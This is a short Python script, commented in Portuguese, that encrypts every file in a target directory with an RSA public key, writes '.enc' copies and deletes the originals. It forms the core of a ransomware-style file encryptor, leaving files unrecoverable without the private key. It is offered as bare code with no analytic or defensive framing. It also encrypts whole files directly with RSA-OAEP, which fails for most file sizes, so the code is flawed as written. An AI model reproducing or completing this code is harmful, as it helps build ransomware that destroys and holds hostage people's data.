import os
import glob
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization

# Carregar a chave pública
with open("public_key.pem", "rb") as f:
    public_key = serialization.load_pem_public_key(f.read())

# Função para criptografar arquivos
def encrypt_file(filepath, public_key):
    with open(filepath, "rb") as f:
        plaintext = f.read()

    ciphertext = public_key.encrypt(
        plaintext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open(filepath + ".enc", "wb") as f:
        f.write(ciphertext)

    os.remove(filepath)  # Remove o arquivo original

# Criptografa todos os arquivos de um diretório
def encrypt_directory(directory, public_key):
    for filepath in glob.glob(os.path.join(directory, "*")):
        if not filepath.endswith(".enc"):  # Evita recriptografar arquivos
            encrypt_file(filepath, public_key)

# Definir o diretório alvo
directory = "files"

encrypt_directory(directory, public_key)
print("Arquivos criptografados com sucesso!")
